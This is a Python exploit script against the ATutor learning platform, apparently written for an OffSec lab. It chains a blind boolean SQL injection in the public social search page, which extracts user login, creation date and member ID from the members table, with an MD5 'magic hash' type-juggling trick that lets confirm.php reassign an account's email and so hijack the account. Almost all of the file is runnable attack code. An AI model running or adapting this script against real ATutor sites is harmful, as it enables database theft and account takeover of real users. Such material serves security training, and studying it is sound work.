import sys, re, os
import requests
from bs4 import BeautifulSoup
import hashlib, string, itertools

ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
# List of characters in (rough) order of frequency
# Numbers, small letters, punctuation, big letters (from 32 to 127)

def searchFriends_sqli(ip, inj_str):
    target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str}"
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')

    content_length = int(r.headers['Content-Length'])

    if content_length == 20:
        return False 
    else:
        return True

def extract_data(ip, inj):
    # template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"
    print(f"Extracting data with inj string: {inj}......")

    output = "" # If we already have stuff, can start output with value and change starting i
    for i in range(1,100):
        new_character = False
        for c in ascii_list: # ASCII letters, numbers and punctuation
            query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))={c}%23"
            res = searchFriends_sqli(ip, query_string)
            # print(f"Checking {chr(c)}: {query_string} -- {res}")
            if res == True:
                new_character = True
                output += chr(c)
                print(f"Success, adding {chr(c)} -- {output}")
                break
        if not new_character:
            print("No possible characters, breaking now!")
            break
    print(f"Extracted data: {output}")
    return output

def get_code (domain, id, creation_date):
    count = 0
    print("Searching for valid email......")
    
    for prefix_length in range(1, 5):
        for word in map(''.join,itertools.product(string.ascii_lowercase, \
            repeat=int(prefix_length))):

            raw_string = f"{word}@{domain}{creation_date}{id}"
            hash = hashlib.md5(raw_string.encode()).hexdigest()
            hash_prefix = hash[:10]
            
            if re.match(r'0+[eE]\d+$', hash_prefix):
                print(f"Valid hash: {hash_prefix}")
                print(f"Raw String: {raw_string}")
                return word

    raise Exception("No valid email found!")
    return ""

def hijack_account(ip, email_prefix, domain, member_id):
    email = f"{email_prefix}@{domain}"
    print(f"Hijacking account {member_id} with email {email}")
    
    target = f"http://{ip}/ATutor/confirm.php?id={member_id}&m=0&e={email}"
    r = requests.get(target, allow_redirects=False)
    if r.status_code == 302:
        return True
    else:
        return False

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    username_injection_string = "select/**/login/**/FROM/**/AT_members/**/LIMIT/**/1"
    # username = extract_data(ip, username_injection_string)
    username = "teacher"

    creation_injection_string = f"select/**/creation_date/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
    # creation_date = extract_data(ip, creation_injection_string)
    creation_date = "2016-03-10 16:00:00"

    memberid_injection_string = f"select/**/member_id/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
    # member_id = extract_data(ip, memberid_injection_string)
    member_id = 1

    print(f"Extracted User Details: {username}, {member_id}, {creation_date}")

    email_prefix = get_code("offsec.local", member_id, creation_date)

    hijack_account(ip, email_prefix, "offsec.local", member_id)

if __name__ == '__main__':
    main()